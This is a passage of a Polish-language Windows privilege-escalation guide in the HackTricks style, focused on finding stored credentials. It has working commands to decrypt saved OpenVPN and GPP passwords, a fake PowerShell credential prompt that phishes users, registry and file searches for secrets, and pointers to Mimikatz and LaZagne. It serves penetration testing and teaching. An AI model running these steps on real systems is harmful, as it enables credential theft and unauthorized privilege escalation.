Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi danymi logowania usługi. Przeglądaj archiwum tylko wtedy, gdy masz do tego uprawnienia, i nie umieszczaj odzyskanych sekretów w rutynowych wynikach enumeracji. Sama ścieżka do wtyczki nie dowodzi, że istnieje w niej sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla konta o wyższych uprawnieniach. Sprawdź odpowiednie uprawnienia ACL plików i zastąp ponownie używane poświadczenia odrębnymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku instalacji wtyczek PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź łącznie rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy dotycząca dostawcy użytkowników Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) informuje, że hasła mogą być przechowywane w postaci zwykłego tekstu lub szyfrowane kluczem zapisanym we wspomnianej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla tożsamości o wyższych uprawnieniach; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczenia. Ścieżka ta jest wskazówką inwentaryzacyjną, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w rutynowych wynikach enumeracji.

Oddzielny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet gdy używana jest zewnętrzna baza danych. Openfire zwykle wiąże konsolę administracyjną z interfejsem loopback; lokalne konto nadal może uzyskać dostęp do tego adresu, jeśli nasłuchujący proces jest uruchomiony. Sprawdź łącznie rzeczywisty nasłuchujący proces, uprawnienia roli administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może doprowadzić do uruchomienia jej kodu w kontekście usługi, co może zapewniać wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka do konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera zarządzania analizą śledczą

Konfiguracje serwera Velociraptor, zwykle nazywane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego urzędu certyfikacji. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy zapewni to wyższe uprawnienia, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w kontekście której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie potwierdza dostępu do urzędu certyfikacji serwera. W niektórych wdrożeniach prywatny klucz urzędu certyfikacji jest przechowywany offline, więc czytelna konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź uprawnienia ACL **konfiguracji serwera** w katalogu instalacyjnym oraz w przypadku wszelkich chronionych kopii zapasowych. Jedna z możliwych lokalizacji to `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli usługa korzysta z innej ścieżki, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` rzeczywiście się w nim znajduje. Unikaj umieszczania klucza prywatnego w logach lub wynikach enumeracji. Procedura dostawcy `config api_client` używa klucza urzędu certyfikacji do wystawienia certyfikatu klienta, ale wymagane są również odpowiednie uprawnienia po stronie serwera; utworzenie takiej roli lub jej zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewniać drogę dostępu nawet wtedy, gdy zapis jest niedostępny. Zapytania API z uprawnieniami do wykonywania działań działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe restrykcyjnymi uprawnieniami ACL, w miarę możliwości przechowuj klucz podpisujący urzędu certyfikacji offline oraz ogranicz role API i dostęp do nasłuchujących interfejsów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) oraz [wytyczne dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Dane logowania PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana gdzie indziej. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; na [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazano natywny magazyn. Najpierw sprawdź uprawnienia do plików i ich ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hosta SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego warto sprawdzić, czy znajdują się tam jakieś interesujące dane:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakiś wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe gałęzie rejestru `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wypakowaniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on te gałęzie, a typowe pliki `install.wim`, `boot.wim` i obrazy odzyskiwania często okazują się fałszywymi tropami. Udział SMB to osobna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy jest objęty zakresem. Zobacz [wskazówki Microsoftu dotyczące obrazów Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [dokumentację plików gałęzi rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Hasło GPP zapisane w pamięci podręcznej

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację tej luki w zabezpieczeniach i jej usunięcie.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskiwania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z danymi uwierzytelniającymi:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stara kopia zapasowa ZIP umieszczona bezpośrednio w katalogu głównym witryny udostępnianym przez serwer może ujawniać wcześniejsze pliki konfiguracyjne i dane uwierzytelniające nadające się do ponownego użycia. Sprawdź skonfigurowaną ścieżkę fizyczną witryny i to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz je za narażenie. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Poświadczenia OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o poświadczenia

Zawsze możesz **poprosić użytkownika o podanie swoich poświadczeń, a nawet poświadczeń innego użytkownika**, jeśli sądzisz, że może je znać (zauważ, że bezpośrednie proszenie klienta o **poświadczenia** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które kiedyś zawierały **hasła** w **postaci jawnego tekstu** lub w formacie **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako kandydata na zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim danych uwierzytelniających. Podczas sprawdzania, gdzie przechowywane są takie pliki, sprawdź dostępne profile użytkowników i skonfigurowane katalogi główne udostępniania plików.

Czytelny plik KeePass `.kdbx` jest również tylko wskazówką prowadzącą do zaszyfrowanego sejfu. Jego odblokowanie wymaga właściwego hasła głównego oraz wszelkich skonfigurowanych plików kluczy lub czynników konta. Jeśli podczas autoryzowanego przeglądu znajdziesz w jednym z wpisów parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Wpis w sejfie sam w sobie nie zapewnia uprawnień Administratora ani SYSTEM; dostęp do usługi zdalnej, uprawnienia konta i każdy odrębny krok wykonania usługi również muszą być spełnione. Inwentaryzacja powinna wykazywać ścieżkę do sejfu i możliwość jego odczytu, a nie wyświetlać bazy danych ani zapisanych danych uwierzytelniających.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wprost wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. System Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie istnieje żadna możliwa do odzyskania kopia zapasowa. Traktuj nazwę archiwum jako trop do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może też być tropem związanym z **podpisywaniem kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu zawierającego klucz prywatny](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu z konta innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała wynikowy podpis dla tego skryptu i konta docelowego, a zadanie zaplanowane lub inny mechanizm o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, listy ACL, zasady i polecenie używane w zadaniu.

Sprawdź też dostępne bazy danych profili klientów komunikatorów, notatki i odebrane pliki pod kątem tropów dotyczących danych uwierzytelniających. Eksport odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem wewnątrz archiwum kopii zapasowej o opisowej nazwie. Taki materiał może zapewnić dostęp do osobnego zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego uprawnienia. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych offline wymaga również pasującego ula `SYSTEM`, zgodnie z opisem w [procedurze tworzenia kopii zapasowych i analizie grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania ani kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez kilka programów, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Sprawdź, czy istnieją bazy danych zawierające hasła z **Chrome, Edge lub Firefox**.\
Sprawdź również historię, zakładki i ulubione w przeglądarkach — być może zapisano tam jakieś **hasła**.

W przypadku standardowego profilu **Default** przeglądarki Edge bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` w nadrzędnym katalogu `User Data`. [Firma Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasady `UserDataDir` mogą zmienić tę lokalizację. Obecność plików jest jedynie wskazówką, że mogą zawierać dane logowania: sprawdź, czy pliki są dostępne do odczytu, czy masz dostęp do kontekstu DPAPI danego użytkownika lub innych autoryzowanych materiałów kluczowych oraz czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu zawierają odpowiednio klucz i zaszyfrowane dane logowania. Ich obecność jest jedynie wskazówką: sprawdź, czy oba pliki są dostępne do odczytu, czy zawierają zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim uznasz, że dane logowania są możliwe do wykorzystania. Jeśli odzyskane dane logowania należą do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz [uprawnienia grupy do odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie dowodzą istnienia ścieżki do uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a jego funkcje są udostępniane przez co najmniej jeden interfejs, identyfikowany za pomocą identyfikatora interfejsu (IID).

Klasy i interfejsy COM są definiowane w rejestrze, odpowiednio w **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród identyfikatorów CLSID tego rejestru znajdziesz podrzędny klucz rejestru **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (jeden wątek), **Free** (wiele wątków), **Both** (jeden lub wiele wątków) albo **Neutral** (niezależny od wątku).

![Historia przeglądarek — COM DLL Overwriting: Wśród identyfikatorów CLSID tego rejestru znajdziesz podrzędny klucz rejestru InProcServer32, który zawiera wartość domyślną wskazującą na DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolną z bibliotek DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli tę bibliotekę DLL uruchomi inny użytkownik.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**, który stworzyłem, aby **automatycznie uruchamiać każdy moduł POST metasploit wyszukujący dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** używane przez różne narzędzia, które zapisują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu głównego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego za pomocą** `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj też [**ten wpis**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać innych otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko z pełnym dostępem).]

## Impersonacja klienta Named Pipe

Segmenty pamięci współdzielonej, określane jako **pipes**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, również przez różne sieci. Przypomina to architekturę klient/serwer, w której występują role **serwera named pipe** i **klienta named pipe**.

Gdy **klient** wysyła dane przez pipe, **serwer**, który skonfigurował pipe, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienia **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez ciebie pipe. Instrukcje dotyczące przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala też **przechwytywać komunikację named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept), a to narzędzie umożliwia wyświetlenie wszystkich pipe’ów, aby znaleźć sposoby na eskalację uprawnień: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD w Telephony tapsrv prowadzący do RCE

